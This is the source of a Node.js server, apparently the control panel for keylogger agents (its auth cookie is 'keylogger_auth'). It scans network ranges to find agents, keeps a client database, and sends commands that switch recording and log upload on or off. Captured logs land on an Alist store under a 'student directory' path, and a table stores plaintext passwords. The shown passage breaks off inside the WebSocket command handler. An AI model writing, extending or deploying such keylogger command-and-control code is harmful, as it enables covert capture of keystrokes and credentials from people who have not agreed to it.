const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const net = require('net');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');
const mysql = require('mysql2/promise');
const jschardet = require('jschardet');
const iconv = require('iconv-lite');
const pLimit = require('p-limit');
const winston = require('winston');
const DailyRotateFile = require('winston-daily-rotate-file');
const open = require('open');
const crypto = require('crypto');
const { LRUCache } = require('lru-cache');

// 生成自签名证书的工具函数
function generateSelfSignedCert() {
    const { execSync, spawnSync } = require('child_process');
    const certsDir = './certs';
    
    if (!fs.existsSync(certsDir)) {
        fs.mkdirSync(certsDir, { recursive: true });
    }
    
    const keyPath = path.join(certsDir, 'server.key');
    const certPath = path.join(certsDir, 'server.crt');
    
    if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
        const check = spawnSync('openssl', ['version'], { stdio: 'ignore' });
        if (check.error || check.status !== 0) {
            logger.warn('当前系统未检测到 OpenSSL，无法自动生成自签名证书，请手动提供证书文件');
            return;
        }

        try {
            logger.info('生成自签名 SSL 证书...');
            execSync(`openssl req -x509 -newkey rsa:4096 -keyout "${keyPath}" -out "${certPath}" -days 365 -nodes -subj "/C=CN/ST=State/L=City/O=Organization/CN=localhost"`, { stdio: 'inherit' });
            logger.info('SSL 证书生成完成');
        } catch (error) {
            logger.error('生成 SSL 证书失败，请手动安装 OpenSSL 或提供证书文件', { error: error.message });
        }
    }
}

// 加载环境变量
require('dotenv').config({ path: '.env' });

const AUTH_CONFIG = {
    password: process.env.WEB_PASSWORD,
    secret: process.env.WEB_AUTH_SECRET,
    cookieName: 'keylogger_auth',
    maxAge: 24 * 60 * 60 * 1000
};

// 检查必需的环境变量
if (!AUTH_CONFIG.password) {
    throw new Error('WEB_PASSWORD 环境变量必须设置');
}
if (!AUTH_CONFIG.secret) {
    throw new Error('WEB_AUTH_SECRET 环境变量必须设置');
}

function parseCookies(cookieHeader = '') {
    return cookieHeader.split(';').reduce((cookies, cookie) => {
        const [name, ...rest] = cookie.split('=');
        if (!name) return cookies;
        cookies[name.trim()] = rest.join('=').trim();
        return cookies;
    }, {});
}

function createAuthToken() {
    const expires = Date.now() + AUTH_CONFIG.maxAge;
    const payload = `${expires}`;
    const signature = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(payload).digest('hex');
    return `${payload}.${signature}`;
}

function verifyAuthToken(token) {
    if (!token) return false;
    const [expires, signature] = token.split('.');
    if (!expires || !signature) return false;
    const expected = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(expires).digest('hex');
    try {
        if (!crypto.timingSafeEqual(Buffer.from(signature, 'utf8'), Buffer.from(expected, 'utf8'))) {
            return false;
        }
    } catch (e) {
        return false;
    }
    return Date.now() <= Number(expires);
}

// 配置常量
const CONFIG = {
    alist: {
        url: process.env.ALIST_URL,
        basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
        username: process.env.ALIST_USERNAME,
        password: process.env.ALIST_PASSWORD,
        tokenRefreshMargin: 5 * 60 * 1000,
    },
    db: {
        host: process.env.DB_HOST || 'localhost',
        port: parseInt(process.env.DB_PORT) || 3306,
        user: process.env.DB_USER,
        password: process.env.DB_PASSWORD,
        database: process.env.DB_NAME,
        charset: 'utf8mb4',
        connectionLimit:100,
        queueLimit: 0,
        enableKeepAlive: true,
        keepAliveInitialDelay: 10000,
        maxRetries: 3,
        retryDelay: 1000,
    },
    tcpPort: parseInt(process.env.TCP_PORT) || 9998,
    httpPort: parseInt(process.env.PORT) || 3233,
    heartbeatInterval: 30000,
    reconnectInterval: 60000,
    reconnectTimeout: 3000,
    maxConcurrentReconnects: 10,
    scanConcurrency: 200,
    scanPorts: [9998],
    scanTimeout: 3000,
    uploadSizeLimit: '10mb',
    logDir: './logs',
};

// 检查必需的环境变量
const requiredEnvVars = [
    'WEB_PASSWORD', 'WEB_AUTH_SECRET',
    'ALIST_URL', 'ALIST_USERNAME', 'ALIST_PASSWORD',
    'DB_USER', 'DB_PASSWORD', 'DB_NAME'
];

const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
if (missingVars.length > 0) {
    console.error('缺少必需的环境变量，请在 .env 文件中设置以下变量：');
    missingVars.forEach(varName => console.error(`- ${varName}`));
    console.error('\n或者创建 .env 文件并配置这些变量。');
    process.exit(1);
}

// 初始化日志系统
if (!fs.existsSync(CONFIG.logDir)) {
    fs.mkdirSync(CONFIG.logDir, { recursive: true });
}

const logger = winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: winston.format.combine(
        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
        winston.format.errors({ stack: true }),
        winston.format.splat(),
        winston.format.json()
    ),
    defaultMeta: { service: 'log-manager' },
    transports: [
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'error-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            level: 'error',
            maxSize: '20m',
            maxFiles: '14d'
        }),
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'combined-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            maxSize: '20m',
            maxFiles: '14d'
        }),
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'audit-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            level: 'info',
            maxSize: '20m',
            maxFiles: '30d',
            format: winston.format.combine(
                winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
                winston.format.printf(({ timestamp, level, message, user, action, ...meta }) => {
                    return `${timestamp} [AUDIT] ${user || 'unknown'} - ${action || 'unknown'}: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
                })
            )
        }),
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.printf(({ timestamp, level, message, ...meta }) => {
                    return `${timestamp} [${level}]: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
                })
            )
        })
    ],
});

// 审计日志记录器
const auditLogger = logger.child({ type: 'audit' });

// 辅助函数：统一异步错误处理
const asyncHandler = (fn) => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
};

// 初始化 Express
const app = express();
const server = http.createServer(app);
let wss;

app.use(cors());
app.use(express.json());

function authMiddleware(req, res, next) {
    const allowedPaths = ['/login', '/login.html', '/api/login'];
    if (allowedPaths.includes(req.path)) {
        return next();
    }

    const cookies = parseCookies(req.headers.cookie || '');
    if (verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        return next();
    }

    if (req.path.startsWith('/api/')) {
        return res.status(401).json({ error: '未授权' });
    }
    return res.redirect('/login');
}

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', asyncHandler(async (req, res) => {
    const { password } = req.body;
    const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
    
    if (password === AUTH_CONFIG.password) {
    const token = createAuthToken();
    const secure = process.env.HTTPS_ENABLED === 'true';
    res.cookie(AUTH_CONFIG.cookieName, token, {
        path: '/',
        httpOnly: true,
        sameSite: 'Strict',
        // 不设置 maxAge会话 Cookie（浏览器关闭即失效）
        secure
    });
    auditLogger.info('用户登录成功', { user: 'admin', action: 'login', ip: clientIP });
    return res.json({ success: true });
}
    
    auditLogger.warn('用户登录失败：密码错误', { user: 'unknown', action: 'login_failed', ip: clientIP });
    return res.status(401).json({ success: false, error: '密码错误' });
}));

app.get('/logout', (req, res) => {
    const secure = process.env.HTTPS_ENABLED === 'true';
    res.clearCookie(AUTH_CONFIG.cookieName, {
        path: '/',
        httpOnly: true,
        sameSite: 'Strict',
        secure
    });
    res.redirect('/login');
});

app.use(authMiddleware);

// 用户信息中间件
function userMiddleware(req, res, next) {
    const cookies = parseCookies(req.headers.cookie || '');
    const token = cookies[AUTH_CONFIG.cookieName];
    if (token && verifyAuthToken(token)) {
        req.user = 'admin'; // 简化版，实际可以从 token 中提取用户信息
    } else {
        req.user = 'anonymous';
    }
    next();
}

app.use(userMiddleware);
app.use(express.static(path.join(__dirname, 'public')));

// Alist 客户端
class AlistClient {
    constructor(config) {
        this.baseUrl = config.url.replace(/\/$/, '');
        this.basePath = config.basePath.replace(/\/$/, '');
        this.username = config.username;
        this.password = config.password;
        this.token = null;
        this.tokenExpire = 0;
        this.tokenRefreshMargin = config.tokenRefreshMargin || 5 * 60 * 1000;
        this.logger = logger.child({ module: 'AlistClient' });
    }

    async _request(method, endpoint, data = null, options = {}, retry = true) {
        await this._ensureToken();
        const url = `${this.baseUrl}${endpoint}`;
        const headers = {
            'Authorization': this.token,
            ...options.headers
        };
        try {
            const response = await axios({
                method,
                url,
                data,
                headers,
                timeout: 30000,
                ...options
            });
            return response.data;
        } catch (error) {
            if (retry && error.response && error.response.status === 401) {
                this.logger.warn('Token 失效，重新登录');
                await this._login();
                headers.Authorization = this.token;
                const retryResponse = await axios({ method, url, data, headers, ...options });
                return retryResponse.data;
            }
            this.logger.error(`Alist 请求失败: ${method} ${endpoint}`, { error: error.message });
            throw error;
        }
    }

    async _login() {
        try {
            const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
                username: this.username,
                password: this.password
            });
            if (response.data.code === 200) {
                this.token = response.data.data.token;
                // Token 有效期按 23 小时减去刷新边距计算
                this.tokenExpire = Date.now() + 23 * 60 * 60 * 1000 - this.tokenRefreshMargin;
                this.logger.info('Alist 登录成功');
            } else {
                throw new Error('Alist 登录失败: ' + response.data.message);
            }
        } catch (error) {
            this.logger.error('Alist 登录异常', { error: error.message });
            throw error;
        }
    }

    async _ensureToken() {
        if (!this.token || Date.now() >= this.tokenExpire) {
            await this._login();
        }
    }

    // 旧版路径处理：简单直接，已验证可靠
    _getFullPath(relativePath) {
        // 如果已经是绝对路径（以 / 开头），直接返回
        return relativePath.startsWith('/') ? relativePath : `/${relativePath}`;
    }

    async ensureDir(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        try {
            await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
        } catch (err) {
            if (err.response && err.response.status === 404) {
                await this._request('POST', '/api/fs/mkdir', { path: fullPath });
                this.logger.info(`创建目录: ${fullPath}`);
            } else {
                throw err;
            }
        }
    }

    async listFiles(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        try {
            const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
            if (result.code === 200) {
                let items = [];
                if (result.data?.content && Array.isArray(result.data.content)) {
                    items = result.data.content;
                } else if (result.data?.files && Array.isArray(result.data.files)) {
                    items = result.data.files;
                } else if (Array.isArray(result.data)) {
                    items = result.data;
                }
                return items.map(item => ({
                    filename: item.name || item.filename || 'unknown',
                    size: item.size || 0,
                    uploadTime: new Date(item.modified || item.updated || item.mtime || Date.now())
                }));
            }
            return [];
        } catch (err) {
            if (err.response && err.response.status === 404) {
                return [];
            }
            throw err;
        }
    }

    async readFile(filePath) {
        const fullPath = this._getFullPath(filePath);
        const result = await this._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);

        if (result.code === 200 && result.data) {
            let buffer;
            if (result.data.raw_url) {
                const response = await axios.get(result.data.raw_url, {
                    responseType: 'arraybuffer',
                    headers: { 'Authorization': this.token }
                });
                buffer = Buffer.from(response.data);
            } else if (result.data.content) {
                buffer = Buffer.from(result.data.content, 'base64');
            } else {
                throw new Error('无法获取文件内容');
            }

            const detected = jschardet.detect(buffer);
            const encoding = detected.encoding || 'utf-8';
            this.logger.debug(`文件编码检测: ${filePath} -> ${encoding} (置信度: ${detected.confidence})`);
            return iconv.decode(buffer, encoding);
        }
        throw new Error('文件内容获取失败或文件不存在');
    }

    async downloadFile(filePath, res) {
        const fullPath = this._getFullPath(filePath);
        await this._ensureToken();
        
        // 首先获取文件信息，包含 raw_url
        const infoResponse = await axios({
            method: 'GET',
            url: `${this.baseUrl}/api/fs/get?path=${encodeURIComponent(fullPath)}`,
            headers: { 'Authorization': this.token }
        });

        if (infoResponse.data.code !== 200 || !infoResponse.data.data || !infoResponse.data.data.raw_url) {
            throw new Error('获取文件下载链接失败');
        }

        const rawUrl = infoResponse.data.data.raw_url;
        
        // 使用 raw_url 下载实际文件
        const response = await axios({
            method: 'GET',
            url: rawUrl,
            headers: { 'Authorization': this.token },
            responseType: 'stream'
        });

        // 设置响应头
        if (response.headers['content-type']) {
            res.setHeader('Content-Type', response.headers['content-type']);
        }
        
        // 从文件路径中提取文件名
        const filename = path.basename(filePath);
        res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`);

        // 处理错误和管道
        response.data.on('error', (err) => {
            res.destroy(err);
        });
        response.data.pipe(res);
    }

    async uploadFile(dirPath, filename, content) {
        const fullDir = this._getFullPath(dirPath);
        const fullPath = `${fullDir}/${filename}`;
        await this.ensureDir(dirPath);
        await this._request('PUT', `/api/fs/put?path=${encodeURIComponent(fullPath)}`, content, {
            headers: {
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(content)
            }
        });
        this.logger.info(`文件上传成功: ${fullPath}`);
        return { success: true, filename };
    }

    async deleteFile(filePath) {
    const fullPath = this._getFullPath(filePath);
    const lastSlash = fullPath.lastIndexOf('/');
    const dir = lastSlash > 0 ? fullPath.substring(0, lastSlash) : '/';
    const filename = fullPath.substring(lastSlash + 1);

    await this._request('POST', '/api/fs/remove', {
        path: dir,
        names: [filename]
    });

    this.logger.info(`文件已删除: ${fullPath}`);
    return { success: true };
}

}

const alistClient = new AlistClient(CONFIG.alist);

// MySQL 数据库
const dbPoolConfig = {
    host: CONFIG.db.host,
    port: CONFIG.db.port,
    user: CONFIG.db.user,
    password: CONFIG.db.password,
    database: CONFIG.db.database,
    charset: CONFIG.db.charset,
    connectionLimit: 20, 
    queueLimit: CONFIG.db.queueLimit,
    enableKeepAlive: CONFIG.db.enableKeepAlive,
    keepAliveInitialDelay: CONFIG.db.keepAliveInitialDelay,
};

const pool = mysql.createPool(dbPoolConfig);

async function executeWithRetry(sql, params, retries = CONFIG.db.maxRetries) {
    let lastError;
    for (let i = 0; i < retries; i++) {
        let connection;
        try {
            connection = await pool.getConnection();
            const [result] = await connection.execute(sql, params);
            return result;
        } catch (error) {
            lastError = error;
            logger.warn(`数据库查询失败 (尝试 ${i + 1}/${retries}): ${error.message}`);
            if (error.code === 'PROTOCOL_CONNECTION_LOST' || error.code === 'ECONNREFUSED' || error.fatal) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.db.retryDelay));
                continue;
            }
            throw error;
        } finally {
            if (connection) connection.release();
        }
    }
    throw lastError;
}

function normalizePassword(password) {
    return String(password || '').trim();
}

function hashPassword(password) {
    return crypto.createHash('sha256').update(normalizePassword(password)).digest('hex');
}


async function initDatabase() {
    try {
        // 创建已知客户端表
        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS known_clients (
                id VARCHAR(45) PRIMARY KEY COMMENT '客户端标识 ip:port',
                ip VARCHAR(45) NOT NULL,
                port INT NOT NULL,
                last_seen BIGINT COMMENT '最后在线时间戳（毫秒）',
                created_at BIGINT COMMENT '创建时间戳（毫秒）'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        `);

        // 创建密码黑名单表
        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS password_blacklist (
                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                password_hash CHAR(64) NOT NULL UNIQUE,
                password TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        `);

        logger.info('MySQL 数据库表初始化完成');
    } catch (error) {
        logger.warn('数据库初始化失败，将在无数据库模式下运行', { error: error.message });
    }
}

async function loadKnownClientsFromDB() {
    try {
        const rows = await executeWithRetry('SELECT id, ip, port, last_seen FROM known_clients');
        const clientsMap = new Map();
        rows.forEach(row => {
            clientsMap.set(row.id, {
                ip: row.ip,
                port: row.port,
                lastSeen: row.last_seen ? new Date(row.last_seen) : null
            });
        });
        logger.info(`从数据库加载了 ${clientsMap.size} 个已知客户端`);
        return clientsMap;
    } catch (error) {
        logger.warn('加载已知客户端失败，返回空列表', { error: error.message });
        return new Map();
    }
}

async function saveKnownClientToDB(clientId, ip, port) {
    try {
        const now = Date.now();
        await executeWithRetry(
            `INSERT INTO known_clients (id, ip, port, last_seen, created_at) 
             VALUES (?, ?, ?, ?, ?) 
             ON DUPLICATE KEY UPDATE 
                 ip = VALUES(ip), 
                 port = VALUES(port), 
                 last_seen = VALUES(last_seen)`,
            [clientId, ip, port, now, now]
        );
    } catch (error) {
        logger.warn('保存客户端到数据库失败', { error: error.message, clientId });
    }
}

async function updateLastSeen(clientId) {
    try {
        const now = Date.now();
        await executeWithRetry(
            'UPDATE known_clients SET last_seen = ? WHERE id = ?',
            [now, clientId]
        );
    } catch (error) {
        logger.warn('更新客户端最后在线时间失败', { error: error.message, clientId });
    }
}

async function deleteKnownClientFromDB(clientId) {
    try {
        await executeWithRetry('DELETE FROM known_clients WHERE id = ?', [clientId]);
        logger.info(`数据库记录已删除: ${clientId}`);
    } catch (error) {
        logger.warn('从数据库删除客户端失败', { error: error.message, clientId });
    }
}

// ClientManager
class ClientManager {
    constructor() {
        this.clients = new Map();
        this.knownClients = new Map();
        this.webClients = new Set();
        this.tcpServer = null;
        this.heartbeatTimer = null;
        this.reconnectLimit = pLimit(CONFIG.maxConcurrentReconnects);
        this.logger = logger.child({ module: 'ClientManager' });
    }

    async init() {
        await initDatabase();
        this.knownClients = await loadKnownClientsFromDB();

        this.startTcpServer();
        this.startHeartbeat();
        await this.connectAllKnownClients();
    }

    startTcpServer() {
        this.tcpServer = net.createServer((socket) => {
            const remoteAddress = socket.remoteAddress.replace(/^::ffff:/, '');
            const remotePort = socket.remotePort;
            const clientId = `${remoteAddress}:${remotePort}`;

            this.logger.info(`客户端主动连接: ${clientId}`);

            const client = {
                id: clientId,
                ip: remoteAddress,
                port: remotePort,
                socket,
                status: 'online',
                recording: true,
                uploadEnabled: false,
                lastSeen: new Date(),
                logDir: alistClient.basePath,
                shouldReconnect: false
            };

            const existing = this.clients.get(clientId);
            if (existing) {
                existing.socket.destroy();
                this.clients.delete(clientId);
            }

            this.clients.set(clientId, client);
            this.knownClients.set(clientId, {
                ip: remoteAddress,
                port: remotePort,
                lastSeen: new Date()
            });
            saveKnownClientToDB(clientId, remoteAddress, remotePort).catch(e => this.logger.error(e));

            this.setupSocketListeners(client);
            this.broadcastClientUpdate(client, 'connected');
        });

        this.tcpServer.on('error', (err) => {
            this.logger.error('TCP 服务器错误', { error: err.message });
        });

        this.tcpServer.listen(CONFIG.tcpPort, () => {
            this.logger.info(`TCP 被动监听端口 ${CONFIG.tcpPort}`);
        });
    }

    setupSocketListeners(client) {
        const currentSocket = client.socket;

        currentSocket.on('data', (data) => {
            try {
                const messages = data.toString().split('\n').filter(m => m.trim());
                messages.forEach(msg => {
                    try {
                        const response = JSON.parse(msg);
                        this.handleResponse(client, response);
                    } catch (e) {
                        this.logger.error(`解析客户端消息失败: ${msg}`);
                    }
                });
            } catch (e) {
                this.logger.error('处理客户端数据失败', { error: e.message });
            }
        });

        currentSocket.on('close', () => {
            if (client.socket === currentSocket) {
                this.logger.info(`客户端 ${client.id} 连接断开`);
                this.markClientOffline(client);
            }
        });

        currentSocket.on('error', (err) => {
            if (client.socket === currentSocket) {
                this.logger.error(`客户端 ${client.id} 错误: ${err.message}`);
                this.markClientOffline(client);
                // 立即尝试重连（使用 reconnectLimit 控制并发）
                this.reconnectSingleClient(client.id).catch(e =>
                    this.logger.debug(`客户端 ${client.id} 立即重连失败: ${e.message}`)
                );
            }
        });
    }

    markClientOffline(client) {
        client.status = 'offline';
        const now = new Date();
        client.lastSeen = now;
        if (this.knownClients.has(client.id)) {
            this.knownClients.get(client.id).lastSeen = now;
        }
        updateLastSeen(client.id).catch(e => this.logger.error(e));
        this.broadcastClientUpdate(client, 'offline');
    }

    handleResponse(client, response) {
        client.lastSeen = new Date();
        updateLastSeen(client.id).catch(e => this.logger.error(e));

        if (response.status === 'ok' && response.data) {
            if (response.data.recording !== undefined) {
                client.recording = response.data.recording;
            }
            if (response.data.upload_enabled !== undefined) {
                client.uploadEnabled = response.data.upload_enabled;
            }
        }

        this.broadcastToWeb({
            type: 'client_response',
            clientId: client.id,
            response
        });
    }

    sendCommand(clientId, command) {
        const client = this.clients.get(clientId);
        if (!client || client.status === 'offline') {
            return { success: false, error: '客户端离线或不存在' };
        }

        return new Promise((resolve) => {
            const commandStr = JSON.stringify(command) + '\n';
            client.socket.write(commandStr, (err) => {
                if (err) {
                    resolve({ success: false, error: err.message });
                } else {
                    resolve({ success: true });
                }
            });
        });
    }

    async broadcastCommand(command) {
        const tasks = [];
        for (const [clientId, client] of this.clients) {
            if (client.status === 'online') {
                tasks.push(
                    this.sendCommand(clientId, command).then(result => ({ clientId, ...result }))
                );
            }
        }
        return Promise.all(tasks);
    }

    startHeartbeat() {
        this.heartbeatTimer = setInterval(() => {
            this.clients.forEach(async (client, clientId) => {
                if (client.status === 'online') {
                    try {
                        const result = await this.sendCommand(clientId, { action: 'ping' });
                        if (!result.success) {
                            this.logger.warn(`心跳失败: ${clientId}`);
                            this.markClientOffline(client);
                            this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                        }
                    } catch (e) {
                        this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
                        this.markClientOffline(client);
                        this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                    }
                }
            });
        }, CONFIG.heartbeatInterval);
    }

    async connectAllKnownClients() {
        this.logger.info('开始逐个连接已知客户端...');
        const connectTasks = [];
        for (const [clientId, info] of this.knownClients.entries()) {
            const existingClient = this.clients.get(clientId);
            if (existingClient && existingClient.status === 'online') {
                continue;
            }
            connectTasks.push(this.reconnectLimit(() => this.reconnectSingleClient(clientId)));
        }
        await Promise.allSettled(connectTasks);
        this.logger.info('已知客户端连接尝试完成');
    }





    async reconnectSingleClient(clientId) {
        try {
            const info = this.knownClients.get(clientId);
            if (!info) {
                this.logger.warn(`尝试重连未知客户端: ${clientId}`);
                return;
            }
            this.logger.info(`尝试重连: ${clientId}`);
            const clientInfo = await this.tryConnect(info.ip, info.port);
            if (clientInfo) {
                this.logger.info(`重连成功: ${clientId}`);
            } else {
                this.logger.debug(`重连失败: ${clientId}`);
            }
        } catch (e) {
            this.logger.error(`重连异常: ${clientId}`, { error: e.message });
        }
    }

    async deleteKnownClient(clientId) {
        const client = this.clients.get(clientId);
        if (client) {
            client.socket.destroy();
            this.clients.delete(clientId);
        }
        this.knownClients.delete(clientId);
        await deleteKnownClientFromDB(clientId);
        this.broadcastToWeb({
            type: 'client_deleted',
            clientId: clientId
        });
        this.logger.info(`客户端 ${clientId} 已被完全删除`);
    }

    getClientInfo(client) {
        return {
            id: client.id,
            ip: client.ip,
            port: client.port,
            status: client.status,
            recording: client.recording,
            uploadEnabled: client.uploadEnabled,
            lastSeen: client.lastSeen
        };
    }

    getAllClients() {
        const allClients = [];
        for (const client of this.clients.values()) {
            allClients.push(this.getClientInfo(client));
        }
        for (const [clientId, info] of this.knownClients.entries()) {
            if (!this.clients.has(clientId)) {
                allClients.push({
                    id: clientId,
                    ip: info.ip,
                    port: info.port,
                    status: 'offline',
                    recording: false,
                    uploadEnabled: false,
                    lastSeen: info.lastSeen
                });
            }
        }
        return allClients;
    }

    addWebClient(ws) {
        this.webClients.add(ws);
        ws.send(JSON.stringify({
            type: 'clients_list',
            clients: this.getAllClients()
        }));
    }

    removeWebClient(ws) {
        this.webClients.delete(ws);
    }

    broadcastClientUpdate(client, eventType) {
    const updateMsg = JSON.stringify({
        type: 'client_updated',
        event: eventType,
        client: this.getClientInfo(client)
    });
    const listMsg = JSON.stringify({
        type: 'clients_list',
        clients: this.getAllClients()
    });

    const messages = [updateMsg, listMsg];
    this.webClients.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            // 检查缓冲区积压量，超过阈值则跳过本次发送
            if (ws.bufferedAmount > 1024 * 64) { // 64KB 阈值
                this.logger.warn(`WebSocket 客户端积压过多，跳过本次广播`);
                return;
            }
            messages.forEach(msg => ws.send(msg));
        }
    });
}

    broadcastToWeb(data) {
        const message = JSON.stringify(data);
        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                if (ws.bufferedAmount > 1024 * 64) {
                    this.logger.warn(`WebSocket 客户端积压过多，跳过单条消息广播`);
                    return;
                }
                ws.send(message);
            }
        });
    }

    async scanNetwork(startIp, endIp, ports = CONFIG.scanPorts) {
        const startParts = startIp.split('.').map(Number);
        const endParts = endIp.split('.').map(Number);
        if (startParts.length !== 4 || endParts.length !== 4) {
            throw new Error('IP 地址格式错误');
        }

        const ipStringToNumber = (ip) => {
            const parts = ip.split('.').map(Number);
            if (parts.length !== 4 || parts.some(part => Number.isNaN(part) || part < 0 || part > 255)) {
                throw new Error('IP 地址格式错误');
            }
            return parts.reduce((acc, part) => acc * 256n + BigInt(part), 0n);
        };
        const ipNumberToString = (num) => {
            return [
                Number((num >> 24n) & 0xFFn),
                Number((num >> 16n) & 0xFFn),
                Number((num >> 8n) & 0xFFn),
                Number(num & 0xFFn)
            ].join('.');
        };

        const startInt = ipStringToNumber(startIp);
        const endInt = ipStringToNumber(endIp);
        const total = Number(endInt - startInt + 1n);
        if (total <= 0) {
            throw new Error('IP 范围无效');
        }
        if (total > 65536) {
            throw new Error('扫描范围过大，最多允许 65536 个 IP');
        }

        this.logger.info(`开始扫描网络: ${startIp} - ${endIp}, 端口: ${ports.join(',')}`);

        const foundClients = [];
        const limit = pLimit(CONFIG.scanConcurrency);

        const tasks = [];
        for (let i = 0; i < total; i++) {
            const ip = ipNumberToString(startInt + BigInt(i));
            tasks.push(limit(() => this.scanIp(ip, ports).then(client => {
                if (client) foundClients.push(client);
            })));
        }
        await Promise.allSettled(tasks);

        this.logger.info(`扫描完成，发现 ${foundClients.length} 个客户端`);
        return foundClients;
    }

    async scanIp(ip, ports) {
        for (const port of ports) {
            const client = await this.tryConnect(ip, port);
            if (client) return client;
        }
        return null;
    }

    tryConnect(ip, port) {
        return new Promise((resolve) => {
            const cleanIp = ip.split('/')[0];
            const socket = new net.Socket();
            let resolved = false;

            const cleanup = (result) => {
                if (!resolved) {
                    resolved = true;
                    socket.destroy();
                    resolve(result);
                }
            };

            socket.setTimeout(CONFIG.reconnectTimeout);
            socket.connect(port, cleanIp, () => {
                socket.write(JSON.stringify({ action: 'ping' }) + '\n', (err) => {
                    if (err) {
                        cleanup(null);
                        return;
                    }
                    const responseTimeout = setTimeout(() => cleanup(null), 2000);

                    socket.once('data', (data) => {
                        clearTimeout(responseTimeout);
                        try {
                            const msg = JSON.parse(data.toString().split('\n')[0]);
                            if (msg.status === 'ok' || msg.action === 'pong') {
                                const clientId = `${cleanIp}:${port}`;
                                let client = this.clients.get(clientId);
                                const now = new Date();
                                if (!client) {
                                    client = {
                                        id: clientId,
                                        ip: cleanIp,
                                        port,
                                        socket,
                                        status: 'online',
                                        recording: true,
                                        uploadEnabled: false,
                                        lastSeen: now,
                                        logDir: alistClient.basePath,
                                        shouldReconnect: false
                                    };
                                    this.clients.set(clientId, client);
                                    this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
                                    saveKnownClientToDB(clientId, cleanIp, port).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'connected');
                                } else {
                                    const oldSocket = client.socket;
                                    oldSocket.removeAllListeners();
                                    oldSocket.destroy();

                                    client.socket = socket;
                                    client.status = 'online';
                                    client.lastSeen = now;
                                    if (this.knownClients.has(clientId)) {
                                        this.knownClients.get(clientId).lastSeen = now;
                                    }
                                    updateLastSeen(clientId).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'updated');
                                }
                                resolved = true;
                                resolve(this.getClientInfo(client));
                            } else {
                                cleanup(null);
                            }
                        } catch (e) {
                            cleanup(null);
                        }
                    });
                });
            });

            socket.on('error', () => cleanup(null));
            socket.on('timeout', () => cleanup(null));
            socket.on('close', () => {
                if (!resolved) {
                    cleanup(null);
                }
            });
        });
    }

    manualConnect(ip, port) {
        // 直接调用 tryConnect，不经过 reconnectSingleClient 的去重逻辑
        return this.tryConnect(ip, port);
    }
}

const clientManager = new ClientManager();

// 辅助函数：根据 clientId 获取客户端信息
function getClientInfoById(clientId) {
    let client = clientManager.clients.get(clientId);
    if (client) {
        return {
            exists: true,
            isOnline: true,
            ip: client.ip,
            logDir: client.logDir
        };
    }
    const known = clientManager.knownClients.get(clientId);
    if (known) {
        return {
            exists: true,
            isOnline: false,
            ip: known.ip,
            logDir: alistClient.basePath
        };
    }
    return { exists: false };
}

function handleWebSocketConnection(ws, req) {
    const cookies = parseCookies(req.headers.cookie || '');
    if (!verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        logger.warn('拒绝未授权的 WebSocket 连接');
        ws.close(1008, 'Unauthorized');
        return;
    }

    logger.info('Web 客户端已连接');
    clientManager.addWebClient(ws);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            switch (data.type) {
                case 'command':
                    const result = await clientManager.sendCommand(data.clientId, data.command);
                    ws.send(JSON.stringify({ type: 'command_result', result }));
                    break;

                case 'broadcast_command':
                    const results = await clientManager.broadcastCommand(data.command);
                    ws.send(JSON.stringify({ type: 'broadcast_result', results }));
                    break;

                case 'scan_network':
                    try {
                        const found = await clientManager.scanNetwork(
                            data.startIp,
                            data.endIp,
                            data.ports || CONFIG.scanPorts
                        );
                        ws.send(JSON.stringify({ type: 'scan_complete', found }));
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'scan_error', message: e.message }));
                    }
